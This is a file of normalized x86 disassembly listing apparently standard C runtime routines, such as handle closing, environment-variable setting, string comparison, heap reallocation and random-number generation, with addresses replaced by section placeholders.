mov ebp eax
cmp ebp edi
je r-xdata
sub_40b64f
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40b81b
push esi
call sub_40b6ac
push esi
mov edi eax
call sub_40b87a
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_40b6ac
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_40b7d9
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_40ac3a
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_40b7d9
push 0x1
mov edi eax
call sub_40b7d9
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_40b7d9
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40b75a
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40b72f
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40706c
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40b75a
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40b7d9
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_40b81b
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_408a6f
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_408ad0
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_40b8a0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_40b8e0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_40b920
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40b95a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_40b577
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_40b577
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_405d70
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_405d70
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_40bbd7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_40c129
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_40bdb6
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_40bd5e
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_4070b4
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_40b5e1
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_40bff1
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_40706c
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_40bff1
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_4070b4
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_405b40
inc eax
inc eax
push eax
call sub_4070b4
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_405950
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_40706c
pop ecx
mov [ rw-data ] eax
sub_40bd5e
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_40b5a2
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_40bdb6
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_4070b4
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_4062ea
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_40c1c0
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_40be20
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_408a6f
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_408ad0
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_40c1eb
mov ebx eax
add esp 0x4
call sub_40c1eb
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_40bef0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_408a6f
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40c1eb
mov ebx eax
add esp 0x4
call sub_40c1eb
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_408ad0
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40bff1
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_4070b4
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_40706c
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x9
call sub_408a6f
push ebx
call sub_40958b
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
pop ecx
je r-xdata
mov eax edi
push esi
call sub_40a08c
test eax eax
pop ecx
jne r-xdata
push 0x9
call sub_408ad0
test esi esi
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push eax
call sub_409d96
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_4098e1
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
push 0x9
call sub_408ad0
pop ecx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_405e30
push ebx
push [ ebp + 0xc ]
call sub_4095b6
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_405e30
push ebx
push [ ebp + 0xc ]
call sub_4095b6
add esp 0x14
mov eax esi
sub_40c129
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_408a6f
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406fb0
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_408ad0
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_408ad0
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_408ad0
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_40c1c0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_405b40
inc eax
push eax
call sub_4070b4
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_405950
pop ecx
pop ecx
pop esi
retn
sub_40c1eb
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40b353
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40154b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax rw-data
mov esp ebp
pop ebp
retn
sub_405880
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4058a0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4058a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_405942
push [ esp + 0x4 ]
call sub_4058b7
pop ecx
retn
sub_405bbb
call sub_40644b
mov ecx [ esp + 0x4 ]
mov [ eax + 0x14 ] ecx
retn
sub_405bc8
call sub_40644b
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_405e20
push [ esp + 0x4 ]
call sub_40706c
pop ecx
retn
sub_406197
push 0x1
push [ esp + 0x8 ]
call sub_4070c6
pop ecx
pop ecx
retn
sub_4061d9
push 0x19
call sub_4062ea
pop ecx
retn
sub_40630f
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_40871d
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_4086e4
sub_406438
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_40661c
call sub_4091b2
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_4090a7
sub_406f6a
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_406f77
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_406f87
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_407b9c
mov edx [ esp + 0x4 ]
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_40a21f
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_407bb6
cmp [ esp + 0x4 ] 0xffffffff
je r-xdata
retn
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_40a2fb
pop ecx
pop ecx
sub_407bf1
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_407cf7
push rw-data
push rw-data
call sub_407cf7
add esp 0x10
retn
call eax
sub_407c1e
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_407c40
add esp 0xc
retn
sub_407c2f
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_407c40
add esp 0xc
retn
sub_407ce5
push 0xd
call sub_408a6f
pop ecx
retn
sub_407cee
push 0xd
call sub_408ad0
pop ecx
retn
sub_408534
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4085be
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_408534
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4085ea
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_4086c9
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_408556
add esp 0x8
pop ebp
retn 0x4
sub_408969
push 0x1
pop eax
retn
sub_408a46
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_408d9a
push esi
push 0xb
call sub_408a6f
push [ esp + 0xc ]
call sub_408dbb
push 0xb
mov esi eax
call sub_408ad0
add esp 0xc
mov eax esi
pop esi
retn
sub_4091b2
push 0x1
call sub_4091bb
pop ecx
retn
sub_40a369
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40a37a
add esp 0xc
retn
sub_40a783
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40a3ab
pop ecx
mov [ rw-data ] 0x1
sub_40ac31
push 0x2
call sub_4062ea
pop ecx
retn
sub_40acad
call sub_40644b
add eax 0x8
retn
sub_40acb6
call sub_40644b
add eax 0xc
retn
sub_40b463
push 0x1
pop eax
retn
sub_40b517
push 0x1
pop eax
retn
sub_40b87a
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_40bb11
push 0x1
pop eax
retn
sub_40bb80
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
